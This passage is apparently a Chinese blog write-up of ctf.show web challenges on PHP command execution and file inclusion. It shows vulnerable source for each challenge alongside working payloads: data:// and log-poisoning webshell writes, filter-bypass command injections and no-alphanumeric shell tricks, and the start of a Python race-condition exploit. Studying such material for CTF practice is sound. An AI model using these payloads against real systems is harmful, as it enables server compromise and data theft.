<p>由于禁用了flag关键字不能使用php://协议，但是在<code>allow_url_include=On、allow_url_fopen()=On</code>的条件下，可以使用data://协议写webshell。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="web38">web38</h3>
<p>沿用上一题的payload。</p>
<p>另外还可以包含日志，在UA中写入一句话，然后直接包含日志文件<code>/var/log/nginx/access.log</code></p>
<h3 id="web39">web39</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:text/plain,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_put_contents(<span class="string">&quot;test.php&quot;</span>,<span class="string">&quot;&lt;?php system(&#x27;cat f*&#x27;);&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="web40">web40</h3>
<p>考点：无参数函数绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤之后还剩所有的字母和<code>!();_|</code>字符，既然括号还在那么就可以使用函数，用无参数函数解决。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>yu22x师傅提到还可以在特定PHP版本 <strong>5.4&lt;php&lt;7.2</strong> 的情况下使用session_id()绕过。</p>
<p>目标站点用的PHP7.2+，限制了PHPSESSID的合法字符。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201019101214.png" alt=""></p>
<h3 id="web41">web41</h3>
<h3 id="web42">web42</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span>($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;cat flag.php;</span><br></pre></td></tr></table></figure>
<h3 id="web43">web43</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;sort flag.php||</span><br></pre></td></tr></table></figure>
<h3 id="web44">web44</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;sort%20fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web45">web45</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;sort%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web46">web46</h3>
<p>沿用上一题的payload。</p>
<h3 id="web47">web47</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;nl%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web48">web48</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>沿用上一题的payload。</p>
<h3 id="web49">web49</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>沿用上一题的payload。</p>
<blockquote>
<p>话说为什么%还是可以用。</p>
</blockquote>
<h3 id="web50">web50</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;nl&lt;fl&quot;&quot;ag.php||</span><br></pre></td></tr></table></figure>
<h3 id="web51">web51</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>沿用上一个payload。</p>
<h3 id="web52">web52</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;nl$&#123;IFS&#125;&#x2F;fl&#39;&#39;ag||</span><br></pre></td></tr></table></figure>
<h3 id="web53">web53</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php</span><br></pre></td></tr></table></figure>
<h3 id="web54">web54</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;grep$&#123;IFS&#125;&#39;&#39;$&#123;IFS&#125;????.php</span><br></pre></td></tr></table></figure>
<h3 id="web55">**web55</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个题还是可以的，思路P神也提到过https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</p>
<p>具体思路还是看P神的讲解，简单来说就是在上传文件的时候，PHP会在/tmp目录下生成一个临时文件，比如<code>/tmp/phpcjggLC</code>，我们可以上传一个bash文件，然后利用Linux通配符和<code>.</code>命令来运行这个脚本文件。</p>
<p>首先构造一个上传页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bb128af7-7ae6-40b9-81f2-f1797563529f.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后抓包，更改包的数据：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201019202120.png" alt=""></p>
<h3 id="web56">web56</h3>
<p>沿用上一题的payload。</p>
<h3 id="web57">**web57</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>来学骚姿势了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
<p>解释一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(())   &#x3D;&#x3D;&gt; 0</span><br><span class="line">$((~$(())))   &#x3D;&#x3D;&gt; -1</span><br><span class="line">$(($((~$(())))$((~$(())))))  &#x3D;&#x3D;&gt; -2</span><br><span class="line">......</span><br><span class="line">$((~-37))   &#x3D;&#x3D;&gt; 36</span><br></pre></td></tr></table></figure>
<h3 id="web58-59">web58&amp;59</h3>
<p>蚁剑连接</p>
<h3 id="web60">web60</h3>
<p>蚁剑连接 + <a href="https://github.com/Medicean/as_bypass_php_disable_functions">插件绕过</a></p>
<h3 id="web61-70">web61-70</h3>
<p>命令执行+文件包含</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201020101508.png" alt=""></p>
<h3 id="web71">**web71</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<p>做这个题的时候思路走偏了，一直想着用convert编码方式绕过。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&#39;flag.txt&#39;);exit();</span><br></pre></td></tr></table></figure>
<p>还有一个更牛逼的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&#39;flag.txt&#39;);echo ~ob_get_content();</span><br></pre></td></tr></table></figure>
<p>然后再对每个字符&amp;0xff再取反。</p>
<h3 id="web72">**web72</h3>
<p>代码和上一道题是一样的。</p>
<p>还是不会，找个wp瞅瞅学一学。</p>
<h2 id="web入门-文件包含">web入门 文件包含</h2>
<h3 id="web78">web78</h3>
<p>最简单的文件包含利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web79">web79</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以通过UserAgent写shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201020214817.png" alt=""></p>
<p>然后再包含日志文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201020214840.png" alt=""></p>
<p>不过也还可以用data伪协议写入webshell。</p>
<h3 id="web80">web80</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次过滤了data和php，但是还是可以通过大小写Php://input绕过</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201021083531.png" alt=""></p>
<h3 id="web81">web81</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一种解法同web79。</p>
<p>第二种解法是通过session.upload_progress和条件竞争GetShell，exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span><span class="string">&quot;http://15b479e2-6c40-4f72-a293-5562a7523e29.chall.ctf.show/&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: sessid</span><br><span class="line">&#125;</span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span 